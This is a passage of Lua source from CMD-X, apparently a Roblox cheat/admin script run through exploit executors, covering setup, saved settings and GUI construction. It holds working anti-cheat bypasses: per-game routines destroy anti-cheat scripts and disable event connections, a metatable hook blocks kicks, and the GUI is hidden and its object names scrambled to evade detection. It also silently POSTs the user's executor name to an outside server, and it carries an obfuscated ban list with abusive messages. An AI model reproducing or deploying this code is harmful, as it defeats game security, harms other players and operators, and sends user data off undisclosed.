		Stand("Looks like Infinite Yield has something to say.","We have no problem with you using both products","", "We have deleted their text-to-speech message for your convenience","We don't know where such a message is coming from. Please don't show any disrespect to ZWolf or Edge, they had nothing to do with it to my knowledge. -fini","Continue", true)
		return nil
	end
	return namecall(self, ...)
end)
setreadonly(mt, true)--]]

	Stand("CMD-X V2 is in development.", "Please join the discord for development updates.", "You can get the discord invite by using the .discord command.", "", "", "Continue", true)
	while not RunDude do wait() end

	wait(.5)

	Current = {Version = "1.9.9f"}
	if Current and Current.Version ~= ver then
		Stand("CMD-X is not up to par!","CMD-X cannot run.","","Your version: "..ver,"Current version: "..Current.Version,"Run Anyway",true)
		while not RunDude do
			wait()
		end
	end
	local _S__ = ""
	if identifyexecutor then
		_S__ = select(1, identifyexecutor())
	end
	if request or syn and syn.request then
		local re = request or syn.request
		re({
			Url = "https://fini.work/experiment",
			Method = "POST",
			Headers = {
				requester = "Client",
				ezD = _S__
			}
		})
	end

	--repeat wait() until RunDude == true

	-- Variables: ------------------------|
	local player = cmdlp
	local cmdl = game:GetService("Lighting")
	local cmdrs = game:GetService("ReplicatedStorage")
	local cmdrs2 = game:GetService("RunService")
	local cmdts = game:GetService("TweenService")
	local cmdvu = game:GetService("VirtualUser")
	local cmduis = game:GetService("UserInputService")
	local Mouses = cmdlp:GetMouse()
	cmdm = Mouses

	local Devs = {
		[39081] = "Owner", -- Fini
		[23899181] = "Owner", -- Pigeon
		[142804804] = "Dev", -- Adam
	}

	DevCords = {
		"alx#9999";
		"pigeon#0256";
		"adam.#0004"
	}

	local Donors = {
		[27857816] = "1",
		[1593530598] = "1",
		[1210065667] = "1",
		[1675012876] = "1",
		[601259819] = "1",
		[1705160893] = "1",
		[721317702] = "1",
		[381299060] = "1",
		[62254438] = "1",
		[80660070] = "1",
		[68822680] = "1",
		[143626710] = "1",
		[38027403] = "1",
		[13913098] = "1",
		[64101399] = "1",
		[24308208] = "1",
		[1132193781] = "1",
		[50296684] = "1",
		[541776532] = "1",
		[366030180] = "1",
		[381515262] = "1",
		[101164614] = "1",

		[1401506430] = "2",
		[676116823] = "2",
		[869278474] = "2",
		[1837905336] = "2",
		[102584667] = "2",
		[1608042178] = "2",
		[76075913] = "2",
		[77464736] = "2",
		[199876604] = "2",
		[901149570] = "2",
		[52286515] = "2",
		[8826296] = "2",

		[908657] = "Custom1",
		[376132] = "Custom3",
		[1406394712] = "Custom4",
		[89579038] = "Custom5", -- top donor {$200}
		[18923632] = "Custom6",
		[272502925] = "Custom7",
		[453568] = "Custom8",
		[432122324] = "Custom9",
	}

	local Tier = {
		["1"] = {
			Tag = "Donor of CMD-X",
			Color = Color3.fromRGB(255,70,70),
			SCHAT = "DONOR"
		},
		["2"] = {
			Tag = "Donor of CMD-X",
			Color = Color3.fromRGB(255,215,100),
			SCHAT = "DONOR"
		},
		["Custom1"] = {
			Tag = "cr",
			Color = Color3.fromRGB(209,156,240),
			SCHAT = "CR"
		},
		["Custom2"] = {
			Tag = "Infernal",
			Color = Color3.fromRGB(170, 1, 20),
			SCHAT = "INFERNAL"
		},
		["Custom3"] = {
			Tag = "The Chosen",
			Color = Color3.fromRGB(63, 0, 0),
			SCHAT = "THE CHOSEN"
		},
		["Custom4"] = {
			Tag = "Ex-Top Donor",
			Color = Color3.fromRGB(255,0,255),
			SCHAT = "EX-TOP"
		},
		["Custom5"] = {
			Tag = "DuBz_Bubby",
			Color = "RGBDev",
			SCHAT = "TOP DONOR"
		},
		["Custom6"] = {
			Tag = "Classy Cute",
			Color = Color3.fromRGB(252,144,3),
			SCHAT = "SUGAR DADDY"
		},
		["Custom7"] = {
			Tag = "Duck",
			Color = Color3.fromRGB(0,255,255),
			SCHAT = "DUCK",
		},
		["Custom8"] = {
			Tag = "7",
			Color = Color3.fromRGB(255,0,0),
			SCHAT = "7"
		},
		["Custom9"] = {
			Tag = "NO BITCHES?",
			Color = Color3.fromRGB(176, 0, 0),
			SCHAT = "NO BITCHES?"
		},
	}

	function loaddefaults()
		text2 = false
		hotkeyopen = 'q'
		hotkeyfocus = ';'
		hotkeyfly = ''
		hotkeyxray = ''
		hotkeyesp = ''
		hotkeyaimbot = ''
		prefix = '.'
		prompt = 'CMD-X Prompt >'
		enterCMD = {}
		gotoPos = 0
		gotoPosSide = 0
		gotoPosHead = 0
		WPs = {}
		discordTag = ''
		permfcspeed = 1
		permflyspeed = 1
		permwalkspeed = 50
		permjumppower = 150
		permhipheight = 20
		permgravity = 196.2
		permmaxsl = 89.99
		Adm = {}
		hkBinds = {}
		dStyle = "rounded"
		conFly = true
		suggestions = true
		oldNum = 0
		hotkeyctp = "LeftControl"
		permspamspeed = 1
		mentions = true
		sDetect = true
		SavedPos = {X = 900, Y = 600}
		hotkeynoclip = ""
		ChatBind = false
		CMDTab = {"commands","credits","plugin","changestyle","hotkeys","entercmds","support","",""}
		TabsOff = true
		KeepCMDXOn = false
		ifKickedAuto = false
		whyIs = 0
		combos = {}
		drawingtype = "old"
		aliases = {}
		clicktplimit = 0
	end

	function updatesaves()
		local update = {
			text2 = text2;
			hotkeyopen = hotkeyopen;
			hotkeyfocus = hotkeyfocus;
			hotkeyfly = hotkeyfly;
			hotkeyxray = hotkeyxray;
			hotkeyesp = hotkeyesp;
			hotkeyaimbot = hotkeyaimbot;
			prefix = prefix;
			prompt = prompt;
			enterCMD = enterCMD;
			gotoPos = gotoPos;
			gotoPosSide = gotoPosSide;
			gotoPosHead = gotoPosHead;
			WPs = WPs;
			discordTag = discordTag;
			permfcspeed = permfcspeed;
			permflyspeed = permflyspeed;
			permwalkspeed = permwalkspeed;
			permjumppower = permjumppower;
			permhipheight = permhipheight;
			permgravity = permgravity;
			permmaxsl = permmaxsl;
			Adm = Adm;
			AdmIG = AdmIG;
			hkBinds = hkBinds;
			dStyle = dStyle;
			conFly = conFly;
			suggestions = suggestions;
			oldNum = oldNum;
			hotkeyctp = hotkeyctp;
			permspamspeed = permspamspeed;
			mentions = mentions;
			sDetect = sDetect;
			SavedPos = SavedPos;
			hotkeynoclip = hotkeynoclip;
			ChatBind = ChatBind;
			CMDTab = CMDTab;
			TabsOff = TabsOff;
			KeepCMDXOn = KeepCMDXOn;
			ifKickedAuto = ifKickedAuto;
			whyIs = whyIs;
			drawingtype = drawingtype;
			aliases = aliases;
			clicktplimit = clicktplimit;
			combos = combos;
		}
	end

	function loadsaves()
		text2 = saves.text2
		hotkeyopen = saves.hotkeyopen
		hotkeyfocus = saves.hotkeyfocus
		hotkeyfly = saves.hotkeyfly
		hotkeyxray = saves.hotkeyxray
		hotkeyesp = saves.hotkeyesp
		hotkeyaimbot = saves.hotkeyaimbot
		prefix = saves.prefix
		prompt = saves.prompt
		enterCMD = saves.enterCMD
		gotoPos = saves.gotoPos
		gotoPosSide = saves.gotoPosSide
		gotoPosHead = saves.gotoPosHead
		WPs = saves.WPs
		discordTag = saves.discordTag
		permfcspeed = saves.permfcspeed
		permflyspeed = saves.permflyspeed
		permwalkspeed = saves.permwalkspeed
		permjumppower = saves.permjumppower
		permhipheight = saves.permhipheight
		permgravity = saves.permgravity
		permmaxsl = saves.permmaxsl
		Adm = saves.Adm
		AdmIG = saves.AdmIG
		hkBinds = saves.hkBinds
		dStyle = saves.dStyle
		conFly = saves.conFly
		suggestions = saves.suggestions
		oldNum = saves.oldNum
		hotkeyctp = saves.hotkeyctp
		permspamspeed = saves.permspamspeed
		mentions = saves.mentions
		sDetect = saves.sDetect
		SavedPos = saves.SavedPos
		hotkeynoclip = saves.hotkeynoclip
		ChatBind = saves.ChatBind
		CMDTab = saves.CMDTab
		TabsOff = saves.TabsOff
		KeepCMDXOn = saves.KeepCMDXOn
		ifKickedAuto = saves.ifKickedAuto
		whyIs = saves.whyIs
		combos = saves.combos
		drawingtype = saves.drawingtype
		aliases = saves.aliases
		clicktplimit = saves.clicktplimit
	end

	local function writefile() return end
	local function readfile() return end
	local function isfile() return end
	local function isfolder() return end

	if writefile and readfile then
		loadsaves()
	else
		loaddefaults()
	end

	checkArg = {
		[172667278.9] = "\85\115\105\110\103\32\98\111\116\115\32\116\111\32\39\97\116\116\101\109\112\116\39\32\116\111\32\114\97\105\100\32\67\77\68\45\88\32\115\101\114\118\101\114\46",
		[117849776.6] = "\83\116\105\108\108\32\110\101\101\100\32\116\104\97\116\32\114\101\97\115\111\110\32\111\110\32\119\104\121\46",
		[838753790.5] = "\100\117\110\110\111\32\119\104\121\32\121\111\117\114\32\98\108\39\101\100\32\98\117\116\32\103\111\110\110\97\32\107\101\101\112\32\117\32\115\105\110\99\101\32\117\114\32\112\114\111\102\105\108\101\32\103\97\121\46",
		[3993039278.4] = "",
		[628686490.5] = "\83\101\110\100\105\110\103\32\99\104\105\108\100\112\111\114\110\32\116\111\32\104\122\46",
		[303591427.1] = "",
		[6571024505.1] = "\110\105\99\101\32\116\114\121",
		[54603839] = "",
	}
	local requirements = cmdlp["\85\115\101\114\73\100"]

	function isDoneLoading(arg)
		if checkArg[requirements * 290 / 100] then
			whyIs = requirements
			updatesaves()
			return false
		elseif checkArg[whyIs * 290 / 100] then
			return false
		else
			whyIs = 0
			updatesaves()
			return true
		end
	end

	if cmduis.VREnabled then
		SavedPos = {X = 147, Y = 324}
	end

	function commandsLoaded()
		return isDoneLoading()
	end

	Inputting = false
	ChatBar = nil
	Current = nil

	if not commandsLoaded() then
		Stand("\89\111\117\32\97\114\101\32\110\111\116\32\119\101\108\99\111\109\101\32\97\116\32\67\77\68\45\88\46","\67\77\68\45\88\32\119\105\108\108\32\110\111\116\32\114\117\110\46","","\82\101\97\115\111\110\58\32"..checkArg[whyIs * 290 / 100],"","",false)
		repeat wait() until RunDude == true
	end

	function Check()
		wait(.1)
		Inputting = false
		Disconnection:Disconnect()
	end

	function InputBegan()
		if cmduis:GetFocusedTextBox() then
			ChatBar = cmduis:GetFocusedTextBox()
			Inputting = true
			Current = ChatBar.FocusLost
			Disconnection = Current:Connect(Check)
		end
	end
	InputConnect = cmduis.InputBegan:Connect(InputBegan)

	AntiCheat = {
		ScriptDetectOff = false;
		TurboNameSpam = false;
		HideParentInExploit = false;
		HideParentInPG = false;
		AutoAntiKick = false;
		RemoveScripts = false;
		IntroAudioOff = false;
		DontJumbleNames = false;
		OneTimeScramble = false;
		PrintingOff = false;
		NoGui = false;
		Custom1 = false;
		Attachment = "HairAttachment";
		Warning1 = false;
		CheckFocusBreak = false;
	}

	AntiCheat.Games = {

		[176053469] = function()
			AntiCheat.CheckFocusBreak = true
			Unnamed.Parent = Parents[3]
		end,

		[4052062489] = function()
			AntiCheat.AutoAntiKick = true
		end,

		[5278850819] = function()
			workspace.FallenPartsDestroyHeight = 0/0
			AntiCheat.Attachment = "Sf"
			AntiCheat.Warning1 = true
			for _,v in pairs(workspace.Structure.KillPart:GetChildren()) do
				v:Destroy()
			end
			for _,v in pairs(workspace.Structure.Edges:GetChildren()) do
				v:Destroy()
			end
			for _,c in pairs(getconnections(char.DescendantAdded)) do c:Disable() end
			for _,c in pairs(getconnections(hrp:GetPropertyChangedSignal("Velocity"))) do c:Disable() end
			for _,c in pairs(getconnections(hum:GetPropertyChangedSignal("WalkSpeed"))) do c:Disable() end
			for _,c in pairs(getconnections(hum:GetPropertyChangedSignal("JumpPower"))) do c:Disable() end
			for _,c in pairs(getconnections(game.ReplicatedStorage.Remotes.ChildRemoved)) do c:Disable() end
			game.ReplicatedStorage.Remotes.event:Destroy()
		end,

		[2988554876] = function()
			cmdrs.AC:Destroy()
			cmdlp.PlayerScripts.AntiCheat:Destroy()
		end,

		[10019007167] = function()
			AntiCheat.ScriptDetectOff = true
			AntiCheat.IntroAudioOff = true
			Unnamed.Parent = Parents[3]
		end,
	}

	if AntiCheat.Games[game.PlaceId] then
		pcall(function() AntiCheat.Games[game.PlaceId]() end)
	end

	if AntiCheat.Custom1 then
		local old = mt.__namecall
		setreadonly(mt, false)
		mt.__namecall = newcclosure(function(self,...)
			if self.Name == "TimeEvent" then
				return
			end
			return old(self, ...)
		end)
		setreadonly(mt, true)
	end

	if AntiCheat.HideParentInPG then
		getParent = cmdlp.PlayerGui
	end

	if AntiCheat.HideParentInExploit then
		if syn.protect_gui then
			getParent = syn.protect_gui
			syn.protect_gui(Unnamed)
		elseif get_hidden_gui then
			getParet = get_hidden_gui
			Unnamed.Parent = get_hidden_gui()
		else
			Stand("Your exploit does not support syn.protect_gui/get_hidden_gui!","CMD-X cannot run.","Explanation;","This game has an anti-cheat and our way of stopping it is through syn.protect_gui/get_hidden_gui.","","Run Anyway",true)
			repeat wait() until RunDude == true
		end
	end

	if AntiCheat.AutoAntiKick then
		local oldcall = mt.__namecall
		setreadonly(mt,false)
		mt.__namecall = newcclosure(function(...)
			local args = {...}
			if getnamecallmethod() == "Kick" then
				return nil
			end
			return oldcall(self,...)
		end)
	end

	if AntiCheat.RemoveScripts then
		for _,v in pairs(cmdp:GetDescendants()) do
			if v:IsA("LocalScript") and v.Name ~= "Animate" and v.Parent ~= "Chat" then
				v:Destroy()
			end
		end
		Stand("CMD-X has to delete local scripts!","Your game may not work.","Explanation;","This game has an anticheat and our way of solving it is removing scripts.","","Run Anyway",true)
		repeat wait() until RunDude == true
	end

	if AntiCheat.OneTimeScramble then
		Unnamed.Name = math.random(1,100000)
	end

	local AudioIds = {5032588119}

	if AntiCheat.IntroAudioOff == false then
		local Sound2 = Instance.new("Sound", nil)
		local c = getconnections(game:GetService("PolicyService").ChildAdded)
		for i,v in pairs(c) do v:Disable() end
		Sound2.Parent = game:GetService("PolicyService")
		for i,v in pairs(c) do v:Enable() end
		Sound2.Name = "19324854"
		Sound2.SoundId = "http://www.roblox.com/asset/?id="..AudioIds[1]
		Sound2:Play()
	end

	holder = Instance.new("Frame", getParent)
	holder.Visible = false
	output = Instance.new("Frame", getParent)
	output1 = Instance.new("TextLabel", getParent)
	output2 = Instance.new("TextLabel", getParent)
	output3 = Instance.new("TextLabel", getParent)
	output4 = Instance.new("TextLabel", getParent)
	output5 = Instance.new("TextLabel", getParent)
	output6 = Instance.new("TextLabel", getParent)
	output7 = Instance.new("TextLabel", getParent)
	output8 = Instance.new("TextLabel", getParent)
	output9 = Instance.new("TextLabel", getParent)
	entry = Instance.new("Frame", getParent)
	user = Instance.new("TextLabel", getParent)
	cmd = Instance.new("TextBox", getParent)
	cmdsu = Instance.new("TextLabel", getParent)
	output.Name = "output"
	output.Parent = holder
	output.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
	output.BorderSizePixel = 0
	output.Position = UDim2.new(0, -8, 0, 19)
	output.Size = UDim2.new(0, 525, 0, 253)
	output.Style = Enum.FrameStyle.RobloxRound
	output.Visible = false

	local Gui = {}
	if not AntiCheat.HideParentInExploit and getParent ~= game then
		for _,v in pairs(getParent:GetDescendants()) do
			table.insert(Gui,v.Name)
			table.insert(Gui,math.random(-2e9,2e9))
		end
	end

	if getParent ~= game then
		game:GetService("RunService").RenderStepped:Connect(function()
			if AntiCheat.DontJumbleNames == false then
				if AntiCheat.HideParentInExploit == false then
					if AntiCheat.TurboNameSpam == false then
						Unnamed.Name = Gui[math.random(#Gui)]
					else
						for _,v in pairs(Unnamed:GetDescendants()) do
							v.Name = Gui[math.random(#Gui)]
						end
					end
				else
					if AntiCheat.TurboNameSpam == false then
						Unnamed.Name = math.random(1000000)
					else
						for _,v in pairs(Unnamed:GetDescendants()) do
							v.Name = math.random(1000000)
						end
					end
				end
			end
		end)
	end

	function Confirm(Reason,Reason2)
		Confirmation = false
		HeyDestroyed = false

		ConfirmationFrame = Instance.new("Frame", getParent)
		Sure = Instance.new("TextLabel", getParent)
		Not = Instance.new("TextLabel", getParent)
		Help2 = Instance.new("TextLabel", getParent)
		Yes = Instance.new("TextButton", getParent)
		No = Instance.new("TextButton", getParent)

		ConfirmationFrame.Name = "ConfirmationFrame"
		ConfirmationFrame.Parent = Unnamed
		ConfirmationFrame.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
		ConfirmationFrame.BackgroundTransparency = 0
		ConfirmationFrame.BorderSizePixel = 0
		ConfirmationFrame.Position = UDim2.new(0.328281224, 0, 0.362222254, 0)
		ConfirmationFrame.Size = UDim2.new(0.342812598, 0, 0.275277853, 0)

		Sure.Name = "Sure"
		Sure.Parent = ConfirmationFrame
		Sure.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Sure.BackgroundTransparency = 1.000
		Sure.Position = UDim2.new(0.489562482, 0, 0.113113157, 0)
		Sure.Size = UDim2.new(0.0199999996, 0, 0.0500000007, 0)
		Sure.Font = Enum.Font.GothamBold
		Sure.Text = Reason
		Sure.TextColor3 = Color3.fromRGB(255, 255, 255)
		Sure.TextSize = 20.000

		Not.Name = "Not"
		Not.Parent = ConfirmationFrame
		Not.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Not.BackgroundTransparency = 1.000
		Not.Position = UDim2.new(0.459936291, 0, 0.222500637, 0)
		Not.Size = UDim2.new(0.0692250952, 0, 0.10650862, 0)
		Not.Font = Enum.Font.GothamBold
		Not.Text = Reason2
		Not.TextColor3 = Color3.fromRGB(255, 255, 255)
		Not.TextSize = 20.000

		if Reason == "Default" then
			Sure.Text = "Are you sure you want to run this command?"
		end
		if Reason2 == "Default" then
			Not.Text = "This may not work properly."
		end

		Help2.Name = "Help2"
		Help2.Parent = ConfirmationFrame
		Help2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Help2.BackgroundTransparency = 1.000
		Help2.Position = UDim2.new(0.467900336, 0, 0.834136486, 0)
		Help2.Size = UDim2.new(0.0622250475, 0, 0.118617564, 0)
		Help2.Font = Enum.Font.GothamBold
		Help2.Text = "Need help? "..cordCode
		Help2.TextColor3 = Color3.fromRGB(255, 255, 255)
		Help2.TextSize = 20.000

		Yes.Name = "Yes"
		Yes.Parent = ConfirmationFrame
		Yes.BackgroundColor3 = Color3.fromRGB(93, 93, 93)
		Yes.BackgroundTransparency = 0.700
		Yes.BorderColor3 = Color3.fromRGB(53, 51, 51)
		Yes.BorderSizePixel = 0
		Yes.Position = UDim2.new(0.310771585, 0, 0.50248313, 0)
		Yes.Size = UDim2.new(0.155925438, 0, 0.147881001, 0)
		Yes.Font = Enum.Font.GothamBold
		Yes.Text = "Yes"
		Yes.TextColor3 = Color3.fromRGB(255, 255, 255)
		Yes.TextSize = 30.000
		Yes.MouseButton1Down:Connect(function()
			ConfirmationFrame:Destroy()
			Confirmation = true
			HeyDestroyed = true
		end)

		No.Name = "No"
		No.Parent = ConfirmationFrame
		No.BackgroundColor3 = Color3.fromRGB(93, 93, 93)
		No.BackgroundTransparency = 0.700
		No.BorderColor3 = Color3.fromRGB(53, 51, 51)
		No.BorderSizePixel = 0
		No.Position = UDim2.new(0.545502543, 0, 0.50248313, 0)
		No.Size = UDim2.new(0.155925438, 0, 0.147881001, 0)
		No.Font = Enum.Font.GothamBold
		No.Text = "No"
		No.TextColor3 = Color3.fromRGB(255, 255, 255)
		No.TextSize = 30.000
		No.MouseButton1Down:Connect(function()
			ConfirmationFrame:Destroy()
			Confirmation = false
			HeyDestroyed = true
		end)

		repeat wait(.01) until HeyDestroyed == true
	end

	holder.Name = "holder"
	holder.Parent = Unnamed
	holder.ZIndex = 2147483647
	holder.BackgroundColor3 = Color3.new(1, 1, 1)
	holder.BackgroundTransparency = 1
	holder.Position = UDim2.new(0, SavedPos.X, 0, SavedPos.Y)
	holder.Size = UDim2.new(0, 525, 0, 277)
	holder.Active = false

	local updatedebounce = tick()
	holder.Changed:Connect(function()
		if tick() - updatedebounce > 2 then
			SavedPos = {X = holder.AbsolutePosition.X, Y = holder.AbsolutePosition.Y}
			updatesaves()
			updatedebounce = tick()
		end
	end)

	HoldTab = Instance.new("Frame",getParent)
	TnOT = Instance.new("TextLabel",getParent)
	Splitz = Instance.new("Frame",getParent)
	T1 = Instance.new("TextLabel",getParent)
	XE = Instance.new("TextButton",getParent)
	T2 = Instance.new("TextLabel",getParent)
	XE_2 = Instance.new("TextButton",getParent)
	T4 = Instance.new("TextLabel",getParent)
	XE_3 = Instance.new("TextButton",getParent)
	T3 = Instance.new("TextLabel",getParent)
	XE_4 = Instance.new("TextButton",getParent)
	T8 = Instance.new("TextLabel",getParent)
	XE_5 = Instance.new("TextButton",getParent)
	T6 = Instance.new("TextLabel",getParent)
	XE_6 = Instance.new("TextButton",getParent)
	T5 = Instance.new("TextLabel",getParent)
	XE_7 = Instance.new("TextButton",getParent)
	T7 = Instance.new("TextLabel",getParent)
	XE_8 = Instance.new("TextButton",getParent)
	T9 = Instance.new("TextLabel",getParent)
	XE_9 = Instance.new("TextButton",getParent)

	HoldTab.Name = "HoldTab"
			HoldTab.Parent = Unnamed
			HoldTab.Active = true
			createDrag(HoldTab)
			HoldTab.BackgroundColor3 = Color3.new(0.219608, 0.219608, 0.219608)
			HoldTab.BorderSizePixel = 0
			HoldTab.Position = UDim2.new(0.745833397, 0, 0.518735349, 0)
			HoldTab.Size = UDim2.new(0, 148, 0, 306)

			if TabsOff then HoldTab.Visible = false end

			TnOT.Name = "TnOT"
			TnOT.Parent = HoldTab
			TnOT.BackgroundColor3 = Color3.new(1, 1, 1)
			TnOT.BackgroundTransparency = 1
			TnOT.BorderSizePixel = 0
			TnOT.Position = UDim2.new(-0.00416688668, 0, -0.000872443721, 0)
			TnOT.Size = UDim2.new(0, 148, 0, 23)
			TnOT.Font = Enum.Font.GothamBold
			TnOT.Text = "CMD TABS"
			TnOT.TextColor3 = Color3.new(1, 1, 1)
			TnOT.TextSize = 20

			Splitz.Name = "Splitz"
			Splitz.Parent = HoldTab
			Splitz.BackgroundColor3 = Color3.new(1, 1, 1)
			Splitz.BorderSizePixel = 0
			Splitz.Position = UDim2.new(-0.00416660309, 0, 0.074290961, 0)
			Splitz.Size = UDim2.new(0, 148, 0, 1)

			entry.Name = "entry"
			entry.Parent = holder
			entry.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
			entry.BorderSizePixel = 0
			entry.Position = UDim2.new(-0.0152380951, 0, 0.965582669, 0)
			entry.Size = UDim2.new(0, 525, 0, 38)

			user.Name = "user"
			user.Parent = entry
			user.BackgroundColor3 = Color3.new(1, 1, 1)
			user.BackgroundTransparency = 1
			user.Position = UDim2.new(-0.0152380941, 0, 0, 0)
			user.Size = UDim2.new(0, 137, 0, 36)
			user.Font = Enum.Font.Code
			user.Text = prompt
			user.TextColor3 = Color3.new(1, 0.333333, 0)
			user.TextSize = 16
			user.TextXAlignment = Enum.TextXAlignment.Right

			cmd.Name = "cmd"
			cmd.Parent = cmdsu
			cmd.BackgroundColor3 = Color3.new(1, 1, 1)
			cmd.BackgroundTransparency = 1
			cmd.BorderSizePixel = 0
			cmd.Position = UDim2.new(-0, 0, 0, 0)
			cmd.Size = UDim2.new(0, 341, 0, 35)
			cmd.Font = Enum.Font.Code
			cmd.PlaceholderText = "Enter CMD here"
			cmd.Text = ""
			cmd.TextWrapped = true
			cmd.TextColor3 = Color3.fromRGB(255,255,255)
			cmd.PlaceholderColor3 = Color3.fromRGB(255,255,255)
			cmd.TextSize = 14
			cmd.TextXAlignment = Enum.TextXAlignment.Left
			cmd.ClearTextOnFocus = false

			cmdsu.Name = "cmdsu"
			cmdsu.Parent = entry
			cmdsu.BackgroundColor3 = Color3.new(1, 1, 1)
			cmdsu.BackgroundTransparency = 1
			cmdsu.BorderSizePixel = 0
			cmdsu.Position = UDim2.new(0.274285644, 0, 0, 0)
			cmdsu.Size = UDim2.new(0, 341, 0, 35)
			cmdsu.Font = Enum.Font.Code
			cmdsu.Text = ""
			cmdsu.TextWrapped = true
			cmdsu.TextColor3 = Color3.fromRGB(100,100,100)
			cmdsu.TextSize = 14
			cmdsu.TextXAlignment = Enum.TextXAlignment.Left

			output1.Name = "output1"
			output1.Parent = output
			output1.BackgroundColor3 = Color3.new(1, 1, 1)
			output1.BackgroundTransparency = 1
			output1.Position = UDim2.new(0.0157605428, 0, 0.849240005, 0)
			output1.Size = UDim2.new(0, 500, 0, 27)
			output1.Font = Enum.Font.Code
			output1.Text = "Need help? "..cordCode
			output1.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output1.TextSize = 16
			output1.TextXAlignment = Enum.TextXAlignment.Left
			output1.TextWrapped = true
			output1.TextTruncate = Enum.TextTruncate.AtEnd

			output2.Name = "output2"
			output2.Parent = output
			output2.BackgroundColor3 = Color3.new(1, 1, 1)
			output2.BackgroundTransparency = 1
			output2.Position = UDim2.new(0.0157605428, 0, 0.74252063, 0)
			output2.Size = UDim2.new(0, 500, 0, 27)
			output2.Font = Enum.Font.Code
			output2.Text = "Current version: "..ver
			output2.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output2.TextSize = 16
			output2.TextXAlignment = Enum.TextXAlignment.Left
			output2.TextWrapped = true
			output2.TextTruncate = Enum.TextTruncate.AtEnd

			output3.Name = "output3"
			output3.Parent = output
			output3.BackgroundColor3 = Color3.new(1, 1, 1)
			output3.BackgroundTransparency = 1
			output3.Position = UDim2.new(0.0157605428, 0, 0.639753819, 0)
			output3.Size = UDim2.new(0, 500, 0, 27)
			output3.Font = Enum.Font.Code
			output3.Text = "Made by "..DevCords[1].." & "..DevCords[2]
			output3.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output3.TextSize = 16
			output3.TextXAlignment = Enum.TextXAlignment.Left
			output3.TextWrapped = true
			output3.TextTruncate = Enum.TextTruncate.AtEnd

			output4.Name = "output4"
			output4.Parent = output
			output4.BackgroundColor3 = Color3.new(1, 1, 1)
			output4.BackgroundTransparency = 1
			output4.Position = UDim2.new(0.0157605428, 0, 0.533034444, 0)
			output4.Size = UDim2.new(0, 500, 0, 27)
			output4.Font = Enum.Font.Code
			output4.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output4.TextSize = 16
			output4.TextXAlignment = Enum.TextXAlignment.Left
			output4.TextWrapped = true
			output4.TextTruncate = Enum.TextTruncate.AtEnd
			local Hints = {"Did you know you can execute multiple commands with ';;'?","Did you know you can create a wait using timedcmd in loops?","You can find commands using 'cmds'.","You can change your prefix by doing 'prefixnew (key)'","Did you know CMD-X was created in October 2019?"}
			output4.Text = Hints[math.random(1,#Hints)]

			output5.Name = "output5"
			output5.Parent = output
			output5.BackgroundColor3 = Color3.new(1, 1, 1)
			output5.BackgroundTransparency = 1
			output5.Position = UDim2.new(0.0157605428, 0, 0.430267632, 0)
			output5.Size = UDim2.new(0, 500, 0, 27)
			output5.Font = Enum.Font.Code
			output5.Text = ""
			output5.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output5.TextSize = 16
			output5.TextXAlignment = Enum.TextXAlignment.Left
			output5.TextWrapped = true
			output5.TextTruncate = Enum.TextTruncate.AtEnd

			output6.Name = "output6"
			output6.Parent = output
			output6.BackgroundColor3 = Color3.new(1, 1, 1)
			output6.BackgroundTransparency = 1
			output6.Position = UDim2.new(0.0157605428, 0, 0.323548257, 0)
			output6.Size = UDim2.new(0, 500, 0, 27)
			output6.Font = Enum.Font.Code
			output6.Text = ""
			output6.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output6.TextSize = 16
			output6.TextXAlignment = Enum.TextXAlignment.Left
			output6.TextWrapped = true
			output6.TextTruncate = Enum.TextTruncate.AtEnd

			output7.Name = "output7"
			output7.Parent = output
			output7.BackgroundColor3 = Color3.new(1, 1, 1)
			output7.BackgroundTransparency = 1
			output7.Position = UDim2.new(0.0157605428, 0, 0.22078146, 0)
			output7.Size = UDim2.new(0, 500, 0, 27)
			output7.Font = Enum.Font.Code
			output7.Text = ""
			output7.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output7.TextSize = 16
			output7.TextXAlignment = Enum.TextXAlignment.Left
			output7.TextWrapped = true
			output7.TextTruncate = Enum.TextTruncate.AtEnd

			output8.Name = "output8"
			output8.Parent = output
			output8.BackgroundColor3 = Color3.new(1, 1, 1)
			output8.BackgroundTransparency = 1
			output8.Position = UDim2.new(0.0157605428, 0, 0.114062086, 0)
			output8.Size = UDim2.new(0, 500, 0, 27)
			output8.Font = Enum.Font.Code
			output8.Text = ""
			output8.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output8.TextSize = 16
			output8.TextXAlignment = Enum.TextXAlignment.Left
			output8.TextWrapped = true
			output8.TextTruncate = Enum.TextTruncate.AtEnd

			output9.Name = "output9"
			output9.Parent = output
			output9.BackgroundColor3 = Color3.new(1, 1, 1)
			output9.BackgroundTransparency = 1
			output9.Position = UDim2.new(0.0157605428, 0, 0.0112952888, 0)
			output9.Size = UDim2.new(0, 500, 0, 27)
			output9.Font = Enum.Font.Code
			output9.Text = ""
			output9.TextColor3 = Color3.new(0.698039, 0.698039, 0.698039)
			output9.TextSize = 16
			output9.TextXAlignment = Enum.TextXAlignment.Left
			output9.TextWrapped = true
			output9.TextTruncate = Enum.TextTruncate.AtEnd

			function sFLY(vfly)
				FLYING = false
				speedofthefly = 1
				speedofthevfly = 1
				while not cmdlp or not cmdlp.Character or not cmdlp.Character:FindFirstChild('HumanoidRootPart') or not cmdlp.Character:FindFirstChild('Humanoid') or not cmdm do
					wait()
				end 
				local T = cmdlp.Character.HumanoidRootPart
				local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				local SPEED = 0
				local function FLY()
					FLYING = true
					local BG = Instance.new('BodyGyro', T)
					local BV = Instance.new('BodyVelocity', T)
					BG.P = 9e4
					BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					BG.cframe = T.CFrame
					BV.velocity = Vector3.new(0, 0, 0)
					BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
					spawn(function()
